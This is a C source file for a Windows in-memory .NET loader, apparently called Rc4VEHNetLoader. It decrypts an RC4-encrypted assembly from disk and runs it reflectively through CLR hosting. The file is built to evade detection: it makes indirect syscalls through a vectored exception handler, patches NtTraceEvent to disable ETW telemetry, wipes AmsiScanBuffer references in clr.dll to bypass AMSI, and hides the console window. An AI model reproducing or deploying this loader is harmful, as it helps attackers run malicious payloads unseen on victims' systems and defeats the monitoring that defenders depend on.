#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <windows.h>
#include <mscoree.h>
#include <metahost.h>
#include <psapi.h>
#include "inc.h"

#pragma comment(lib, "mscoree.lib")

// Syscalls via VEH
// API stub base address and offset to 'syscall' instruction
DWORD64 g_syscall_address = 0;
DWORD64 g_syscall_offset = 0x12;

enum syscall_no {
	SysNtAllocateVirtualMem = 0x18,
	SysNtWriteVirtualMem = 0x3A,
	SysNtProtectVirtualMem = 0x50,
	SysNtCreateThreadEx = 0xC2
};

/* RC4 function */
BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize);

/* VEH Handler */
ULONG HandleException(PEXCEPTION_POINTERS ExceptionInfo) {
	// check Native API call with address of SSN triggers EXCEPTION_ACCESS_VIOLATION
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
		//printf("[!] Getting into Exception Handler\n");

		// modify the registers to set up a form of indirect syscalls
		// mov r10, rcx
		ExceptionInfo->ContextRecord->R10 = ExceptionInfo->ContextRecord->Rcx;

		// mov eax, [SSN]
		// RIP holds SSN
		ExceptionInfo->ContextRecord->Rax = ExceptionInfo->ContextRecord->Rip;
		// syscall
		ExceptionInfo->ContextRecord->Rip = g_syscall_address + g_syscall_offset;

		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

/* Etw Patching */
BOOL EtwPatch() {
	DWORD dwOldProtection = 0x00;
	PBYTE pNtTraceEvent = NULL;

	// Get the address of "NtTraceEvent"
	pNtTraceEvent = (PBYTE)GetProcAddress(GetModuleHandleA("NTDLL"), "NtTraceEvent");
	if (!pNtTraceEvent)
		return FALSE;

	// Search for NtTraceEvent's SSN pointer
	for (int i = 0; i < x64_SYSCALL_STUB_SIZE; i++) {
		if (pNtTraceEvent[i] == x64_MOV_INSTRUCTION_OPCODE) {
			// Set the pointer to NtTraceEvent's SSN and break
			pNtTraceEvent = (PBYTE)(&pNtTraceEvent[i] + 1);
			break;
		}

		// If we reached the 'ret' or 'syscall' instruction, we fail
		if (pNtTraceEvent[i] == x64_RET_INSTRUCTION_OPCODE || pNtTraceEvent[i] == 0x0F || pNtTraceEvent[i] == 0x05)
			return FALSE;
	}
	printf("[+] Found NtTraceEvent's SSN address: 0x%p \n", pNtTraceEvent);

	NTSTATUS status = NULL;
	char patch[4] = { 0xFF };
	size_t size = sizeof(patch);
	_NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)SysNtProtectVirtualMem;
	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)SysNtWriteVirtualMem;

	// Change memory permissions to RWX
	PVOID region = pNtTraceEvent;
	status = pNtProtectVirtualMemory(GetCurrentProcess(), &region, &size, PAGE_EXECUTE_READWRITE, &dwOldProtection);
	if (status != 0) {
		printf("[-] pNtProtectVirtualMemory[1] failed with error: 0x%0.8X \n", status);
		return FALSE;
	}

	// Apply the patch - Replacing NtTraceEvent's SSN with a dummy one (0xFF)
	// Dummy SSN in reverse order
	status = pNtWriteVirtualMemory(GetCurrentProcess(), pNtTraceEvent, patch, sizeof(DWORD), NULL);
	if (status != 0) {
		printf("[-] pNtWriteVirtualMemory failed with error: 0x%0.8X \n", status);
		return FALSE;
	}
	
	// Change memory permissions to original
	status = pNtProtectVirtualMemory(GetCurrentProcess(), &region, &size, dwOldProtection, &dwOldProtection);
	if (status != 0) {
		printf("[-] pNtProtectVirtualMemory[2] failed with error: 0x%0.8X \n", status);
		return FALSE;
	}

	return TRUE;
}

/* AMSI Patching */
#define MAX_PATH 260
#define MAX_REGIONS 1000

BOOL CheckStr(const char* str, int length) {
	if (length < 7) {
		return FALSE;
	}

	// Check from the end of the string
	int offset = length - 1;
	if (str[offset] == 'l' || str[offset] == 'L') {
		offset--;
		if (str[offset] == 'l' || str[offset] == 'L') {
			offset--;
			if (str[offset] == 'd' || str[offset] == 'D') {
				offset--;
				if (str[offset] == '.') {
					offset--;
					if (str[offset] == 'r' || str[offset] == 'R') {
						offset--;
						if (str[offset] == 'l' || str[offset] == 'L') {
							offset--;
							if (str[offset] == 'c' || str[offset] == 'C') {
								return TRUE;
							}
						}
					}
				}
			}
		}
	}
	return FALSE;
}

BOOL IsReadable(DWORD protect, DWORD state) {
	if (!((protect & PAGE_READONLY) == PAGE_READONLY || (protect & PAGE_READWRITE) == PAGE_READWRITE || (protect & PAGE_EXECUTE_READWRITE) == PAGE_EXECUTE_READWRITE || (protect & PAGE_EXECUTE_READ) == PAGE_EXECUTE_READ)) {
		return FALSE;
	}

	if ((protect & PAGE_GUARD) == PAGE_GUARD) {
		return FALSE;
	}

	if ((state & MEM_COMMIT) != MEM_COMMIT) {
		return FALSE;
	}

	return TRUE;
}

BOOL AmsiPatch() {
	/* Loop through each memory region in the current process */
	HANDLE hProcess = GetCurrentProcess();

	// Load system info to identify allocated memory regions
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);

	// Generate a list of memory regions to scan
	MEMORY_BASIC_INFORMATION regions[MAX_REGIONS];
	size_t region_count = 0;
	unsigned char* pAddress = 0;
	MEMORY_BASIC_INFORMATION memInfo;
	while (pAddress < (unsigned char*)sysInfo.lpMaximumApplicationAddress && region_count < MAX_REGIONS) {
		// Query memory region information
		if (VirtualQuery(pAddress, &memInfo, sizeof(memInfo))) {
			regions[region_count] = memInfo;
			region_count++;
		}

		// Move to the next memory region
		pAddress += memInfo.RegionSize;
	}

	// Find and replace all references to AmsiScanBuffer in READWRITE memory
	const char* amsiScanBuffer = "AmsiScanBuffer";
	size_t amsiLen = strlen(amsiScanBuffer);
	int count = 0;
	for (size_t i = 0; i < region_count; i++) {
		MEMORY_BASIC_INFORMATION* region = &regions[i];

		// Skip those memory regions that are not readable
		if (!IsReadable(region->Protect, region->State))
			continue;

		/* Find memory regions mapped to CLR.DLL */
		char path[MAX_PATH];
		if (GetMappedFileNameA(hProcess, region->BaseAddress, path, MAX_PATH) > 0) {
			// Check the filpath ends with CLR.DLL
			if (CheckStr(path, strlen(path))) {
				for (size_t j = 0; j < region->RegionSize - amsiLen; j++) {
					unsigned char* current = ((unsigned char*)region->BaseAddress) + j;

					// Check if the current pointer points to the string "AmsiScanBuffer"
					BOOL found = TRUE;
					for (size_t k = 0; k < amsiLen; k++) {
						if (current[k] != amsiScanBuffer[k]) {
							found = FALSE;
							break;
						}
					}

					// If the pointer points to the string
					if (found) {
						printf("[+] Found AmsiScanBuffer address: 0x%p\n", current);

						// Add WRITE permissions to that memory region (originally should be read-only in .rdata section)
						DWORD original = 0;
						PVOID base = region->BaseAddress;
						_NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)SysNtProtectVirtualMem;

						// Change the permission to RWX
						if ((region->Protect & PAGE_READWRITE) != PAGE_READWRITE) {
							pNtProtectVirtualMemory(GetCurrentProcess(), &base, &(region->RegionSize), PAGE_EXECUTE_READWRITE, &original);
						}

						// Overwrite the string with zeros
						memset(current, 0, amsiLen);
						count++;

						// Restore the original permissions
						if ((region->Protect & PAGE_READWRITE) != PAGE_READWRITE) {
							pNtProtectVirtualMemory(GetCurrentProcess(), &base, &(region->RegionSize), region->Protect, &original);
						}
					}
				}
			}
		}
	}

	return count > 0 ? TRUE : FALSE;
}

/* RC4 Function */
BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
	NTSTATUS STATUS = NULL;

	// Initialize USTRING structures for data and key
	USTRING Data = {
		.payload = pPayloadData,
		.Length = sPayloadSize,
		.MaximumLength = sPayloadSize
	};

	USTRING Key = {
		.payload = pRc4Key,
		.Length = dwRc4KeySize,
		.MaximumLength = dwRc4KeySize 
	};

	// Load the "Advapi32" library and get the address of SystemFunction032
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	// Check if SystemFunction032 was loaded successfully
	if (!SystemFunction032) {
		printf("[!] Error loading SystemFunction032: %d\n", GetLastError());
		return FALSE;
	}

	// Call the SystemFunction032 to perform encryption/decryption
	if ((STATUS = SystemFunction032(&Data, &Key)) != 0x0) {
		printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

/* Read RC4 encrypted payload into memory */
BOOL ReadRc4File(IN LPCSTR fileName, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize, IN PBYTE pRc4Key) {
	FILE* Rc4File;
	//size_t file_size;
	size_t Rc4KeyLen = strlen((char*)pRc4Key);
	PBYTE pFileBuffer = NULL;
	DWORD dwFileSize = 0x00;

	// Open input file
	Rc4File = fopen(fileName, "rb");

	// Get file size
	fseek(Rc4File, 0, SEEK_END);
	dwFileSize = ftell(Rc4File);
	fseek(Rc4File, 0, SEEK_SET);

	// Allocate payload for encrypted payload content
	//pFileBuffer = (char*)malloc(dwFileSize);
	pFileBuffer = (PBYTE)malloc(dwFileSize);
	if (!pFileBuffer) {
		printf("[!] Error: Memory allocation failed\n");
		fclose(Rc4File);
		return FALSE;
	}

	// Read file into payload
	if (fread(pFileBuffer, 1, dwFileSize, Rc4File) != dwFileSize) {
		printf("[!] Error: Failed to read input file\n");
		free(pFileBuffer);
		fclose(Rc4File);
		return FALSE;
	}
	fclose(Rc4File);

	if (!Rc4EncryptionViaSystemFunc032(pRc4Key, pFileBuffer, Rc4KeyLen, dwFileSize)) {
		// Decryption failed
		printf("[!] Error: RC4 decryption failed\n");
		free(pFileBuffer);
		return FALSE;
	}

	*ppFileBuffer = pFileBuffer;
	*pdwFileSize = dwFileSize;

	return ((*ppFileBuffer != NULL) && (*pdwFileSize != 0x00)) ? TRUE : FALSE;
}

// https://github.com/passthehashbrowns/Being-A-Good-CLR-Host
/* Execute the.NET assembly */
BOOL LoadDotnet(IN LPCWSTR runtimeVersion, IN PBYTE AssemblyBytes, IN ULONG AssemblySize, IN PWSTR Arguments, OUT LPSTR* OutputBuffer, OUT PULONG OutputLength) {
	HRESULT hr;
	ICLRMetaHost* pMetaHost = NULL;
	ICLRRuntimeInfo* pRuntimeInfo = NULL;
	ICorRuntimeHost* pRuntimeHost = NULL;
	BOOL bLoadable;
	IUnknown* pAppDomainThunk = NULL;
	AppDomain* pDefaultAppDomain = NULL;
	MethodInfo* pMethodInfo = NULL;
	SAFEARRAY* pSafeArray = NULL;

	SAFEARRAY* pSafeArguments = NULL;
	PWSTR* pAssemblyArgv = NULL;

	HANDLE BackupHandle = NULL;
	HANDLE IoPipeRead = NULL;
	HANDLE IoPipeWrite = NULL;

	// Get ICLRMetaHost instance
	hr = CLRCreateInstance(&CLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)&pMetaHost);
	if (FAILED(hr)) {
		printf("[!] CLRCreateInstance(...) failed\n");
		goto CLEAN_UP;
	}
	printf("[+] CLRCreateInstance(...) succeeded\n");

	// Get ICLRRuntimeInfo instance
	hr = pMetaHost->lpVtbl->GetRuntime(pMetaHost, runtimeVersion, &xIID_ICLRRuntimeInfo, &pRuntimeInfo);
	if (FAILED(hr)) {
		printf("[!] pMetaHost->GetRuntime(...) faile\n");
		goto CLEAN_UP;
	}
	printf("[+] pMetaHost->GetRuntime(...) succeeded\n");

	// Check if the specified runtime can be loaded
	hr = pRuntimeInfo->lpVtbl->IsLoadable(pRuntimeInfo, &bLoadable);
	if (FAILED(hr) || !bLoadable) {
		printf("[!] pRuntimeInfo->IsLoadable(...) failed\n");
		goto CLEAN_UP;
	}
	printf("[+] pRuntimeInfo->IsLoadable(...) succeeded\n");

	// Get ICorRuntimeHost instance to use the normal (deprecated) assembly load API calls
	hr = pRuntimeInfo->lpVtbl->GetInterface(pRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID*)&pRuntimeHost);
	if (FAILED(hr)) {
		printf("[!] pRuntimeInfo->GetInterface(...) failed\n");
		goto CLEAN_UP;
	}
	printf("[+] pRuntimeInfo->GetInterface(...) succeeded\n");

	// Start CLR
	hr = pRuntimeHost->lpVtbl->Start(pRuntimeHost);
	if (FAILED(hr)) {
		printf("[!] pRuntimeHost->Start() failed\n");
		goto CLEAN_UP;
	}
	printf("[+] pRuntimeHost->Start() succeeded\n");

	// Get a handle to the default App Domain
	hr = pRuntimeHost->lpVtbl->GetDefaultDomain(pRuntimeHost, &pAppDomainThunk);
	if (FAILED(hr)) {
		printf("[!] pRuntimeHost->GetDefaultDomain(...) failed\n");
		goto CLEAN_UP;
	}
	printf("[+] pRuntimeHost->GetDefaultDomain(...) succeeded\n");

	// Alternative: Create our custom AppDomain
	/*hr = pRuntimeHost->lpVtbl->CreateDomain(pRuntimeHost, (LPCWSTR)L"testAppDomain", NULL, &pAppDomainThunk);
	if (FAILED(hr)) {
		printf("[!] pRuntimeHost->CreateDomain(...) failed with Error: %lx\n", hr);
		return FALSE;
	}
	printf("[+] pRuntimeHost->CreateDomain(...) succeeded\n");*/

	// Equivalent of System.AppDomain.CurrentDomain in C#
	hr = pAppDomainThunk->lpVtbl->QueryInterface(pAppDomainThunk, &xIID_AppDomain, (VOID**)&pDefaultAppDomain);

	/* AMSI Patching */
	printf("\n[=] Running AmsiPatch...\n");
	if (!AmsiPatch()) {
		printf("[-] AmsiPatch failed\n\n");
		goto CLEAN_UP;
	}
	printf("[+] AmsiPatch succeeded\n\n");

	// Prepare a byte array for the Load_3 API call
	SAFEARRAYBOUND SafeArrayBound[1];
	SafeArrayBound[0].cElements = AssemblySize;
	SafeArrayBound[0].lLbound = 0;
	pSafeArray = SafeArrayCreate(VT_UI1, 1, SafeArrayBound);
	void* pvData = NULL;
	hr = SafeArrayAccessData(pSafeArray, &pvData);
	if (FAILED(hr)) {
		printf("[!] SafeArrayAccessData failed\n");
		goto CLEAN_UP;
	}

	// Copy assembly bytes to pvData
	memcpy(pvData, AssemblyBytes, AssemblySize);

	hr = SafeArrayUnaccessData(pSafeArray);
	if (FAILED(hr)) {
		printf("[!] SafeArrayUnaccessData failed\n");
		goto CLEAN_UP;
	}
	printf("[+] SafeArrayUnaccessData succeeded\n");

	Assembly* pAssembly = NULL;

	// Load_3 API will load .NET assemblies reflectively
	hr = pDefaultAppDomain->lpVtbl->Load_3(pDefaultAppDomain, pSafeArray, &pAssembly);
	if (FAILED(hr)) {
		printf("[!] pDefaultAppDomain->Load_3 failed with Error: %lx\n", hr);
		goto CLEAN_UP;
	}
	printf("[+] pDefaultAppDomain->Load_3 succeeded\n");

	// Get the EntryPoint (Assembly.EntryPoint Property)
	hr = pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo);
	if (FAILED(hr)) {
		printf("[!] pAssembly->EntryPoint(...) failed\n");
		goto CLEAN_UP;
	}
	printf("[+] pAssembly->EntryPoint(...) succeeded\n");

	// Putting arguments provided by user to the .NET assembly
	// Note: SAFEARRAY is a standard data structure in COM, which CLR uses for interoperability between managed (.NET) and unmanaged (C) code
	LONG i = 0;
	int AssemblyArgc = 0;
	VARIANT VariantArgv;

	// Parse the Unicode command line string into a pointer of SAFEARRAY
	pAssemblyArgv = CommandLineToArgvW(Arguments, &AssemblyArgc);

	VariantInit(&VariantArgv);
	VariantArgv.vt = (VT_ARRAY | VT_BSTR);
	VariantArgv.parray = SafeArrayCreateVector(VT_BSTR, 0, AssemblyArgc);

	for (i = 0; i < AssemblyArgc; i++) {
		SafeArrayPutElement(VariantArgv.parray, &i, SysAllocString(pAssemblyArgv[i]));
		wprintf(L"[+] Putting argument into SafeArray: %s\n", pAssemblyArgv[i]);
	}

	// Assign the arguments into a SafeArray
	i = 0;
	pSafeArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);
	SafeArrayPutElement(pSafeArguments, &i, &VariantArgv);

	// Prepare pipe to handle the output of the .NET assembly
	SECURITY_ATTRIBUTES SecurityAttr = { 0 };
	HWND ConExist = NULL;
	HWND ConHandle = NULL;
	

	SecurityAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	SecurityAttr.bInheritHandle = TRUE;
	SecurityAttr.lpSecurityDescriptor = NULL;

	if (!(CreatePipe(&IoPipeRead, &IoPipeWrite, &SecurityAttr, PIPE_BUFFER_LENGTH))) {
		printf("[-] CreatePipe Failed with Error: %lx\n", GetLastError());
		hr = GetLastError();
		goto CLEAN_UP;
	}
	printf("[+] CreatePipe succeeded\n");

	// Hide the console window
	if (!(ConExist = GetConsoleWindow())) {
		AllocConsole();
		if ((ConHandle = GetConsoleWindow())) {
			ShowWindow(ConHandle, SW_HIDE);
		}
	}

	// Redirect standard output to the write end of the pipe
	BackupHandle = GetStdHandle(STD_OUTPUT_HANDLE);
	SetStdHandle(STD_OUTPUT_HANDLE, IoPipeWrite);

	VARIANT retVal;
	ZeroMemory(&retVal, sizeof(VARIANT));
	VARIANT obj;
	ZeroMemory(&obj, sizeof(VARIANT));
	obj.vt = VT_NULL;

	if ((hr = pMethodInfo->lpVtbl->Invoke_3(pMethodInfo, obj, pSafeArguments, &retVal))) {
		printf("[-] MethodInfo->Invoke_3 Failed with Error: %lx\n", hr);
		goto CLEAN_UP;
	}
	printf("[+] MethodInfo->Invoke_3 succeeded\n");

	// Read data from the read end of the pipe and store it in an allocated buffer
	if ((*OutputBuffer = (LPSTR)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PIPE_BUFFER_LENGTH)))) {
		if (!ReadFile(IoPipeRead, *OutputBuffer, PIPE_BUFFER_LENGTH, OutputLength, NULL)) {
			printf("[-] ReadFile Failed with Error: %lx\n", GetLastError());
			goto CLEAN_UP;
		}
	}
	else {
		hr = ERROR_NOT_ENOUGH_MEMORY;
		printf("[-] OutputBuffer Allocation Failed with Error: %lx\n", hr);
		goto CLEAN_UP;
	}
	printf("[+] ReadFile succeeded\n");

	return TRUE;

CLEAN_UP:
	if (pRuntimeHost) {
		pRuntimeHost->lpVtbl->Release(pRuntimeHost);
	}

	if (pRuntimeInfo) {
		pRuntimeInfo->lpVtbl->Release(pRuntimeInfo);
	}

	if (pMetaHost) {
		pMetaHost->lpVtbl->Release(pMetaHost);
	}

	if (pAssemblyArgv) {
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pAssemblyArgv);
		pAssemblyArgv = NULL;
	}

	if (pSafeArray) {
		SafeArrayDestroy(pSafeArray);
		pSafeArray = NULL;
	}

	if (pSafeArguments) {
		SafeArrayDestroy(pSafeArguments);
		pSafeArguments = NULL;
	}

	if (pMethodInfo) {
		pMethodInfo->lpVtbl->Release(pMethodInfo);
	}

	if (BackupHandle)
		SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);

	if (IoPipeRead)
		CloseHandle(IoPipeRead);

	if (IoPipeWrite)
		CloseHandle(IoPipeWrite);

	return FALSE;
}

int HandleCmdLineArgs(int argc, const char* argv[], char** ppe_arg, char** pkey_arg, char** pparm_arg, int* parm_count) {
	if (!argv || !ppe_arg || !pkey_arg || !pparm_arg || !parm_count) {
		if (ppe_arg) *ppe_arg = NULL;
		if (pkey_arg) *pkey_arg = NULL;
		if (pparm_arg) *pparm_arg = NULL;
		if (parm_count) *parm_count = 0;
		return -1;
	}

	char* pe_arg = NULL;
	char* key_arg = NULL;
	char* parm_arg = NULL;
	char* parm_buffer = (char*)malloc(1024 * 2);
	if (!parm_buffer) {
		*ppe_arg = NULL;
		*pkey_arg = NULL;
		*pparm_arg = NULL;
		*parm_count = 0;
		return -1;
	}
	memset(parm_buffer, 0, 1024 * 2);
	size_t buffer_size = 1024 * 2;
	size_t current_len = 0;
	int parm_arg_count = 0;

	for (int i = 1; i < argc; i++) {
		if (strcmp(argv[i], "-pe") == 0 && i + 1 < argc) {
			pe_arg = (char*)argv[++i];
		}
		else if (strcmp(argv[i], "-key") == 0 && i + 1 < argc) {
			key_arg = (char*)argv[++i];
		}
		else if (strcmp(argv[i], "-parm") == 0 && i + 1 < argc) {
			parm_arg = parm_buffer;
			size_t len = strlen(argv[i + 1]);
			if (current_len + len + 1 <= buffer_size) {
				strcpy(parm_arg, argv[++i]);
				current_len += len;
				parm_arg_count++;
			}
			else {
				free(parm_buffer);
				*ppe_arg = NULL;
				*pkey_arg = NULL;
				*pparm_arg = NULL;
				*parm_count = 0;
				return -1;
			}
			while (i + 1 < argc && argv[i + 1][0] != '-') {
				len = strlen(argv[i + 1]) + 1; // +1 for space
				if (current_len + len + 1 <= buffer_size) {
					strcat(parm_arg, " ");
					strcat(parm_arg, argv[++i]);
					current_len += len;
					parm_arg_count++;
				}
				else {
					break; // Truncate to avoid overflow
				}
			}
		}
	}

	// Check if -pe or -key is empty (NULL or empty string)
	if (!pe_arg || pe_arg[0] == '\0' || !key_arg || key_arg[0] == '\0') {
		free(parm_buffer);
		*ppe_arg = NULL;
		*pkey_arg = NULL;
		*pparm_arg = NULL;
		*parm_count = 0;
		return -1;
	}

	*ppe_arg = pe_arg;
	*pkey_arg = key_arg;
	*pparm_arg = parm_arg;
	*parm_count = parm_arg_count;
	return 0;
}

int main(int argc, char* argv[]) {
	// Set up VEH for syscall
	g_syscall_address = (DWORD64)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDrawText");
	PVOID handle = AddVectoredExceptionHandler(TRUE, (PVECTORED_EXCEPTION_HANDLER)HandleException);
	printf("[+] Added VEH for syscall\n");

	// Etw Patching
	printf("\n[=] Running EtwPatch...\n");
	if (EtwPatch())
		printf("[+] EtwPatch succeeded\n\n");
	else
		printf("[-] EtwPatch failed\n\n");
	
	char* pe_arg = "";
	char* key_arg = "";
	char* parm_arg = " ";
	int parm_count = 0;

	// Parse arguments
	printf("[=] Parsing arguments...\n");
	if (HandleCmdLineArgs(argc, argv, &pe_arg, &key_arg, &parm_arg, &parm_count) != 0) {
		printf("[-] Failed to parse arguments\n");
		printf("[!] Rc4VEHNetLoader.exe -pe <payload> -key <key> -parm <arguments>");
		return -1;
	}
	printf("[+] .NET assembly file name: %s\n", pe_arg ? pe_arg : "NULL");
	printf("[+] RC4 key: %s\n", key_arg ? key_arg : "NULL");
	printf("[+] .NET assembly arguments: %s\n", parm_arg ? parm_arg : "NULL");
	printf("[+] The number of assembly arguments: %d\n\n", parm_count);

	wchar_t* arguments = NULL;
	size_t totalLen = 0;
	if (parm_count) {
		// Case 1: arguments are provided after -parm flag.
		size_t totalLen = strlen(parm_arg) + 1;

		arguments = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalLen * sizeof(WCHAR));
		if (!arguments) {
			printf("[-] HeapAlloc failed for arguments\n");
			free(parm_arg);
			return 1;
		}

		size_t convertedChars = 0;
		errno_t err = mbstowcs_s(&convertedChars, arguments, totalLen, parm_arg, _TRUNCATE);
		if (err != 0) {
			printf("[-] mbstowcs_s failed with error code: %d\n", err);
			HeapFree(GetProcessHeap(), 0, arguments);
			free(parm_arg);
			return 1;
		}
	}
	else {
		// Case 2: no arguments are provided after -parm flag. we need to set a PWSTR buffer to an empty wide-character string
		arguments = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WCHAR));
		if (!arguments) {
			printf("[-] HeapAlloc failed for empty arguments\n");
			return 1;
		}
		
		arguments[0] = L'\0';
	}

	// Read the RC4 encrypted file from disk into the current process
	PBYTE pFileBuffer = NULL;
	DWORD dwFileSize = 0;
	printf("[=] Reading and Decrypting RC4 encrypted payload...\n");
	if (!ReadRc4File(pe_arg, &pFileBuffer, &dwFileSize, key_arg)) {
		printf("[-] The RC4 file cannot be read\n");
		return -1;
	}
	printf("[+] RC4 payload has been decrypted\n\n");

	// Loading .NET assembly
	LPSTR OutputBuffer = NULL;
	ULONG OutputLength = 0;

	printf("[=] Laoding the .NET assembly...\n");
	BOOL status = LoadDotnet(L"v4.0.30319", pFileBuffer, dwFileSize, arguments, &OutputBuffer, &OutputLength);
	if (status) {
		printf("[+] LoadDotnet(...) succeeded\n");
		printf("\n\n%s", OutputBuffer);
	}
	else
		printf("[!] LoadDotnet(...) failed\n");

	// Remove VEH
	RemoveVectoredExceptionHandler(handle);

	return 0;
}